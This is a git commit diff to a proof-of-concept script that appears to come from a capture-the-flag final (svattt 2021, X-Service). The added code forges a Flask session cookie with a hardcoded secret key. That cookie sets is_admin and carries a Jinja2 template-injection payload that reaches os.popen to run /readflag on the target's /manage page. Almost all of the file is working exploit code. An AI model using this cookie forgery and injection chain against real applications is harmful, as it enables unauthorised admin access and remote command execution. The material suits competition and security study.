f70f45b9ec673223feb06be43ed1896f98984e1f
taidh <54855855+DauHoangTai@users.noreply.github.com>
2021-11-14 21:08:19 +0700

    Update payload.py

--- svattt/2021/final/X-Service/payload/payload.py
+++ svattt/2021/final/X-Service/payload/payload.py
@@ -1,10 +1,31 @@
 import requests
 import string
 import sys
+from flask.sessions import SecureCookieSessionInterface
+from itsdangerous import URLSafeTimedSerializer
 
+class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
+	def get_signing_serializer(self, secret_key):
+		if not secret_key:
+			return None
+		signer_kwargs = dict(
+			key_derivation=self.key_derivation,
+			digest_method=self.digest_method
+		)
+		return URLSafeTimedSerializer(secret_key, salt=self.salt,
+		                              serializer=self.serializer,
+		                              signer_kwargs=signer_kwargs)
 
-def handle_response(d):
-	print(d)
+def decodeFlaskCookie(secret_key, cookieValue):
+	sscsi = SimpleSecureCookieSessionInterface()
+	signingSerializer = sscsi.get_signing_serializer(secret_key)
+	return signingSerializer.loads(cookieValue)
+
+def encodeFlaskCookie(secret_key, cookieDict):
+	sscsi = SimpleSecureCookieSessionInterface()
+	signingSerializer = sscsi.get_signing_serializer(secret_key)
+	return signingSerializer.dumps(cookieDict)
+
 
 if len(sys.argv) < 2:
 	print("[+] python3 poc.py <url>")
@@ -12,16 +33,18 @@ if len(sys.argv) < 2:
 
 URL = sys.argv[1]
 
+SECRET_KEY = '476345fdc597d6cb6dd68ae949b2694a'
+PAYLOAD = {u'is_admin':1,u'username':"""{%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("/readflag")|attr("read")()%}"""}
+
 def getSession():
-	r = requests.get('http://127.0.0.1:5000')
-	session = r.cookies['session']
-	print(session)
-	return session
+	cookie = encodeFlaskCookie(SECRET_KEY, PAYLOAD)
+	return cookie
 
 def getFlag():
 	cookies = {"session":getSession()}
 	r = requests.get(url=URL+'/manage',cookies=cookies)
 	print(r.text)
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
 	getFlag()
